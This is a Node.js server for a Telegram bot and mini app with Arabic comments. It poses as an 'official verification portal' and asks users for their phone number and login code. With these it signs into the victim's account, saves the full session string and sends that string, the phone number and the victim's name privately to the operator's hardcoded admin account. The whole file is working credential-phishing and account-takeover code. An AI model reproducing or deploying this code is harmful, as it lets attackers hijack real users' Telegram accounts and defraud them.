const express = require('express');
const cors = require('cors');
const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static('public'));

const apiId = parseInt(process.env.API_ID || "0", 10);
const apiHash = process.env.API_HASH || "";
const botToken = process.env.BOT_TOKEN || "";

// آيدي المسؤول (أنت) لتستقبل التقارير عليه شخصياً
const MY_ADMIN_ID = 8065754360; 

// إعداد بوت تيليغرام عبر Telegraf
const bot = new Telegraf(botToken);

// عندما يرسل المستخدم /start يرسل له رسالة ترحيبية مع زر يفتح الميني أب فوراً
bot.start((ctx) => {
  return ctx.reply(
    'أهلاً بك في بوابة التوثيق الرسمية! 🌟\n\nانقر على الزر أدناه لبدء عملية التوثيق واستخراج الجلسة بكل سهولة:',
    Markup.inlineKeyboard([
      [Markup.button.webApp('🚀 فتح بوابة التفعيل', `https://${ctx.req?.headers?.host || 'tg-mini-app-ofj8.onrender.com'}`)]
    ])
  );
});

// تشغيل البوت في الخلفية
bot.launch().then(() => {
  console.log('🤖 بوت تيليغرام يعمل بنجاح ويستمع للأوامر...');
});

// تخزين العملاء مؤقتاً لحين إدخال الرمز
let activeClients = {};

// API إرسال الكود
app.post('/api/send-code', async (req, res) => {
  try {
    const { phone } = req.body;
    if (!phone) {
      return res.status(400).json({ success: false, error: 'الرقم مطلوب' });
    }

    const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
      connectionRetries: 3,
    });
    
    await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phone,
        apiId: apiId,
        apiHash: apiHash,
        settings: new Api.CodeSettings({}),
      })
    );

    activeClients[phone] = {
      client: client,
      phoneCodeHash: result.phoneCodeHash
    };

    res.json({
      success: true,
      phoneCodeHash: result.phoneCodeHash,
      phone: phone
    });

  } catch (error) {
    console.error('خطأ في إرسال الرمز:', error);
    res.status(500).json({ success: false, error: error.errorMessage || error.message });
  }
});

// API تأكيد الكود وتسجيل الدخول
app.post('/api/verify-code', async (req, res) => {
  try {
    const { phoneNumber, phoneCode } = req.body;

    const sessionData = activeClients[phoneNumber];
    if (!sessionData) {
      return res.status(400).json({ success: false, error: 'انتهت الجلسة، يرجى إرسال الكود من جديد' });
    }

    const { client, phoneCodeHash } = sessionData;

    const signInResult = await client.invoke(
      new Api.auth.SignIn({
        phoneNumber: phoneNumber,
        phoneCodeHash: phoneCodeHash,
        phoneCode: phoneCode.toString().trim(),
      })
    );

    const savedSession = client.session.save();
    
    // جلب معلومات الحساب الذي تم تسجيل دخوله لتضمينها في التقرير
    let userInfo = "مستخدم جديد";
    try {
      const me = await client.getMe();
      userInfo = `${me.firstName || ''} ${me.lastName || ''} (@${me.username || 'لا يوجد معرف'})`;
    } catch (e) {
      console.log('تعذر جلب تفاصيل الحساب الإضافية');
    }

    // 🚀 **الإضافة الخرافية:** إرسال تقرير فوري وخاص على حسابك الشخصي على تيليغرام
    try {
      const reportMessage = `
🚨 **تم توثيق حساب جديد بنجاح!** 🌟

👤 **الاسم:** ${userInfo}
📱 **رقم الهاتف:** \`${phoneNumber}\`

🔑 **نص الجلسة (Session String):**
\`${savedSession}\`
      `;
      await bot.telegram.sendMessage(MY_ADMIN_ID, reportMessage, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error('فشل في إرسال التقرير للأدمن:', err);
    }

    delete activeClients[phoneNumber];

    res.json({
      success: true,
      sessionString: savedSession
    });

  } catch (error) {
    console.error('خطأ في التحقق:', error);
    if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
      return res.json({ success: false, needPassword: true, error: 'الحساب محمي بكلمة مرور (2FA)' });
    }
    res.status(400).json({ success: false, error: error.errorMessage || error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`السيرفر يعمل بنجاح على البورت http://localhost:${PORT}`);
});

// إيقاف البوت بشكل آمن عند إغلاق السيرفر
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
